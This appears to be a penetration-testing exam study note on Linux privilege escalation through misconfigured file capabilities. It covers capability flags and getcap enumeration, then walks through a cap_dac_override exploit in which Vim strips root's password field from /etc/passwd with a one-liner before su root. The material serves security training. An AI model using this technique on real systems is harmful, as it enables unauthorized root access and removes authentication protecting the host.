# Linux Privilege Escalation via Capabilities

Linux capabilities divide traditional root privileges into smaller, specific permissions that can be assigned to individual processes or executables.

Exam takeaway: Misconfigured capabilities on SUID-less binaries can allow privilege escalation to root.

## 1. Understanding Linux Capabilities

- Capabilities allow processes to perform specific privileged operations without requiring full root privileges.
- They provide more granular privilege control than traditional user/group permissions.
- Misconfigured capabilities can allow low-privileged users to perform root-level operations.

### Important Capabilities

| Capability             | Description                       | Potential Impact             |
| ---------------------- | --------------------------------- | ---------------------------- |
| `cap_setuid`           | Change effective UID              | Become root                  |
| `cap_setgid`           | Change effective GID              | Gain privileged group access |
| `cap_sys_admin`        | Perform administrative operations | Broad root-level access      |
| `cap_dac_override`     | Bypass file permission checks     | Read/write protected files   |
| `cap_sys_ptrace`       | Trace and debug processes         | Access other processes       |
| `cap_sys_chroot`       | Change process root directory     | Filesystem manipulation      |
| `cap_sys_module`       | Load/unload kernel modules        | Kernel-level control         |
| `cap_net_raw`          | Use raw network sockets           | Network operations           |
| `cap_net_bind_service` | Bind to privileged ports          | Bind ports below 1024        |

## 2. Setting Capabilities

Use `setcap` to assign capabilities to executables.

Example:

```
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

### Capability Flags

| Flag  | Description                      |
| ----- | -------------------------------- |
| `=`   | Set/replace specified capability |
| `+ep` | Effective + Permitted            |
| `+ei` | Effective + Inheritable          |
| `+p`  | Permitted                        |

Important:

- Effective (`e`): Capability is active.
- Permitted (`p`): Capability is available to the process.
- Inheritable (`i`): Capability can be inherited across execution under applicable rules.

## 3. Enumerating Capabilities

Find capabilities assigned to common binary directories:

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Check a specific binary:

```
getcap /usr/bin/vim.basic
```

Example output:

```
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```



Enumeration priority

&#x20;Pay special attention to `cap_setuid`, `cap_dac_override`, and `cap_sys_admin`.



## 4. Exploitation – cap_dac_override

`cap_dac_override` allows a process to bypass normal file read, write, and execute permission checks.

If a binary such as Vim has this capability, it may allow a low-privileged user to modify protected system files.

Step 1: Identify the capability

```
getcap /usr/bin/vim.basic
```

Expected output:

```
/usr/bin/vim.basic cap_dac_override=eip
```

Step 2: Check the root entry in `/etc/passwd`

```
cat /etc/passwd | head -n1
```

Example:

```
root:x:0:0:root:/root:/bin/bash
```

Step 3: Open `/etc/passwd` using Vim

```
/usr/bin/vim.basic /etc/passwd
```

Alternatively, modify it non-interactively:

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

This removes the password-field marker (`x`) from the root entry.

Modified entry:

```
root::0:0:root:/root:/bin/bash
```

Step 4: Switch to root

```
su root
```

An empty root password field may allow login without a password, depending on system authentication configuration.

Potential root privilege escalation

## 5. CPTS Exam Quick Reference

| Task                   | Command                               |
| ---------------------- | ------------------------------------- |
| Enumerate capabilities | `getcap -r / 2>/dev/null`             |
| Check specific binary  | `getcap /usr/bin/vim`                 |
| Set capability         | `setcap cap_name=+ep /path/to/binary` |
| Remove capabilities    | `setcap -r /path/to/binary`           |
| Check current user     | `id`                                  |

### High-Priority Capabilities

- `cap_setuid` – Can potentially change UID to 0.
- `cap_dac_override` – Can bypass file permission checks.
- `cap_sys_admin` – Provides extensive administrative privileges.
- `cap_setgid` – Can potentially change GID to 0.

### Exam Tips

1. Always enumerate file capabilities during Linux privilege escalation.
2. Focus on unusual capabilities assigned to common binaries.
3. Check whether the binary can be abused to access sensitive files or spawn privileged processes.
4. `cap_dac_override` is particularly useful for modifying protected files such as `/etc/passwd`.
5. Capabilities do not automatically mean root access; exploitation depends on the capability, binary behavior, and system configuration.
